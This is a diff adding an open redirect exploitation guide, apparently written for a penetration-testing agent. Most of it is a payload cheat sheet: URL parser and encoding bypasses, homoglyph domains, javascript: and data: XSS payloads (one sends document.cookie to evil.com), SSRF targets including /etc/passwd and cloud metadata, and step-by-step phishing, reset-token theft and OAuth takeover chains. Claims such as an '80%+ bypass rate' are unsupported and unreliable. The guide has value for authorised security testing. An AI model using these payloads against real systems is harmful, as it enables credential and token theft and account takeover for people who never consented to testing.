@@ -1,0 +1,202 @@
+<open_redirect_vulnerability_guide>
+<title>OPEN REDIRECT</title>
+
+<critical>Open redirects enable phishing, OAuth token theft, SSRF, and XSS via unvalidated URLs. Validate all redirect targets against strict allowlists (scheme+host+path) before navigation.</critical>
+
+<scope>
+- URL parameters controlling navigation, flows, or login return states
+- OAuth/SSO flows (redirect_uri, returnTo, continue, callback, next)
+- Multi-hop redirects where only first hop validated
+- Scheme confusion: javascript:, data:, file:, gopher:, blob:
+</scope>
+
+<methodology>
+1. Enumerate all redirect mechanisms: login/logout, OAuth, password reset, payment callbacks.
+2. Identify params all the redirect params
+3. Test universal bypasses: //evil.com, @evil.com, encoding variants.
+4. Probe parser differentials: server validation vs browser execution.
+5. Prove impact: phishing, token theft, SSRF, XSS execution.
+</methodology>
+
+<injection_points>
+- URL params: redirect, url, next, return_to, continue, goto, target, callback, out, redir
+- OAuth/SAML: redirect_uri, post_logout_redirect_uri, state, RelayState
+- Headers: Host, X-Forwarded-Host, Referer, Location
+- Client: window.location, router.push(), location.href, meta refresh
+</injection_points>
+
+<parser_differentials>
+<userinfo_bypass>
+https://trusted.com@evil.com - Server sees trusted.com, browser navigates evil.com
+Variants: trusted.com%40evil.com, foo%40evil.com%40trusted.com
+Success: 80%+ bypass rate
+</userinfo_bypass>
+
+<backslash_confusion>
+https://trusted.com\evil.com - Windows treats \ as /, navigates evil.com
+Variants: \\evil.com, \/evil.com, /\evil.com
+</backslash_confusion>
+
+<whitespace_injection>
+trusted.com%09evil.com, %0Aevil.com - Parsers split differently
+http%09://evil.com, h%09ttp://evil.com
+</whitespace_injection>
+
+<null_byte>
+trusted.com%00.evil.com - C-parsers split, browser continues
+</null_byte>
+
+<fragment_tricks>
+trusted.com#@evil.com, %2523evil.com - Validators check before #
+</fragment_tricks>
+</parser_differentials>
+
+<protocol_bypasses>
+<universal>
+//evil.com (protocol-relative), ///evil.com, /\evil.com, \/\/evil.com
+hTTps://evil.com (case variation) - Bypasses 80% checks
+</universal>
+
+<scheme_confusion>
+http:evil.com, http:/\evil.com, http:\\evil.com
+%00http://evil.com through %1Fhttp://evil.com (control chars)
+http%09://evil.com, http%0A://evil.com
+</scheme_confusion>
+
+<xss_protocols>
+javascript:alert(document.domain), javascript:fetch('//evil.com?c='+document.cookie)
+java%09script:alert(1), jAvAsCrIpT:alert(1)
+data:text/html,<script>alert(1)</script>, data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+</xss_protocols>
+
+<ssrf_protocols>
+file:///etc/passwd, http://127.0.0.1, http://[::1], http://169.254.169.254/latest/meta-data/
+</ssrf_protocols>
+</protocol_bypasses>
+
+<encoding_bypasses>
+URL: %2f%2fevil.com, %252f%252fevil.com | Hex IP: 0x7f.0x00.0x00.0x01, 0x7F.1 | Octal: 0177.0.0.1 | Decimal: 2130706433 | IPv6: [::1], [::ffff:127.0.0.1] | Unicode: еvil.com (Cyrillic), evil。com | Zero-width: %E2%80%8Bevil.com | CRLF: %0D%0A//evil.com
+</encoding_bypasses>
+
+<domain_bypasses>
+<subdomain_tricks>
+trusted.com.evil.com, evil-trusted.com, trusted.com%2Eevil.com
+</subdomain_tricks>
+
+<allowlist_evasion>
+*.trusted.com → sub.evil.com.trusted.com | /trusted\.com/ → evil.trusted.com | contains("trusted") → trusted.com.evil.com | truѕted.com (Cyrillic)
+</allowlist_evasion>
+
+<redirect_chaining>
+redirect_uri=https://trusted.com/out?url=https://evil.com - Double-hop bypass
+</redirect_chaining>
+</domain_bypasses>
+
+<oauth_exploitation>
+<validation_weaknesses>
+Prefix: https://trusted.com → https://trusted.com.evil.com
+Suffix: /callback → /callback@evil.com
+Path traversal: /oauth/../../@evil.com
+Wildcard: *.trusted.com → attacker.trusted.com
+</validation_weaknesses>
+
+<critical_targets>
+redirect_uri (primary), post_logout_redirect_uri (less validated), state (CSRF + leak), RelayState (often unvalidated), Implicit flow (fragment leaked)
+</critical_targets>
+</oauth_exploitation>
+
+<ssrf_chaining>
+<internal_targets>
+127.0.0.1, [::1], 0.0.0.0, localhost, 127.1, 0 | 169.254.169.254/latest/meta-data/ | 192.168.x.x, 10.x.x.x | Bypass: 127.0.0.1.nip.io, localhost.evil.com
+</internal_targets>
+
+<dns_rebinding>
+1. Domain resolves to public IP (passes validation)
+2. TTL expires, rebinds to internal IP
+3. Server follows to internal resource
+4. Exfiltrate via timing/errors
+</dns_rebinding>
+</ssrf_chaining>
+
+<framework_exploitation>
+<server_side>
+Rails: redirect_to params[:url] → params[:url][]=//evil.com
+Django: HttpResponseRedirect(request.GET['next']) → ?next=//evil.com
+PHP: header("Location: ".$_GET['url']) → CRLF vulnerable
+Express: res.redirect(req.query.url) → accepts //evil.com
+Spring: "redirect:"+param → protocol confusion
+</server_side>
+
+<client_side>
+Next.js: router.push(query.redirect) | React: navigate(searchParams.get('url')) | Angular: router.navigateByUrl(params.returnUrl) | Vue: router.push(route.query.next) - Universal: //evil.com works all
+</client_side>
+</framework_exploitation>
+
+<exploitation_scenarios>
+<phishing_chain>
+1. Send: https://trusted.com/login?redirect=https://evil.com/fake
+2. Victim clicks, completes action
+3. Redirects to evil.com cloned page
+4. Credentials captured
+</phishing_chain>
+
+<password_reset_poison>
+1. Password reset + Host: evil.com header
+2. Backend builds: https://evil.com/reset?token=SECRET
+3. Add: &redirect=https://attacker.com
+4. Token leaked, account takeover
+</password_reset_poison>
+
+<session_fixation>
+1. Pre-create session
+2. Send: login?redirect=https://evil.com/capture
+3. Session data captured
+</session_fixation>
+</exploitation_scenarios>
+
+<advanced_techniques>
+<csp_bypass>
+CSP allows script-src https://trusted.com
+Open redirect: trusted.com/out?url=javascript:alert(1)
+CSP trusts domain, JS executes
+</csp_bypass>
+
+<host_header_injection>
+POST /forgot with Host: evil.com → Backend generates: https://evil.com/reset?token=SECRET
+Combine with open redirect for exfiltration
+</host_header_injection>
+
+<meta_refresh_xss>
+Server renders: <meta http-equiv="refresh" content="0;url=USER_INPUT">
+Payload: ?redirect=javascript:alert(1) → XSS
+</meta_refresh_xss>
+</advanced_techniques>
+
+<validation>
+1. Minimal payload with navigation to evil.com (address bar proof).
+2. Demonstrate bypass of validation (allowlist, regex, protocol).
+3. Test browsers (Chrome, Firefox, Safari) for consistency.
+4. Prove impact: phishing, OAuth token capture, SSRF, XSS.
+</validation>
+
+<false_positives>
+- Exact URL allowlist (full scheme+host+path)
+- Relative paths only (no protocol/domain)
+- WHATWG URL API strict validation
+- User confirmation dialog
+- OAuth exact match pre-registration
+</false_positives>
+
+<pro_tips>
+1. Protocol-relative (//evil.com) bypasses naive checks
+2. @evil.com for parser differentials.
+3. Test redirect_uri AND post_logout_redirect_uri separately.
+4. Chain with Host header injection for password reset.
+5. javascript:/data: for XSS when redirect domain in CSP.
+6. 127.0.0.1, 169.254.169.254 for SSRF.
+7. Double-hop via trusted domain bypasses strict validation.
+8. Test in real browsers; parser differences critical.
+</pro_tips>
+
+<remember>Parser differentials are primary weapon. Protocol-relative bypasses most checks. OAuth redirect_uri highest-value target. Chain: redirect → token theft → takeover. Test javascript:/data: for XSS. Document with address bar navigation proof.</remember>
+</open_redirect_vulnerability_guide>
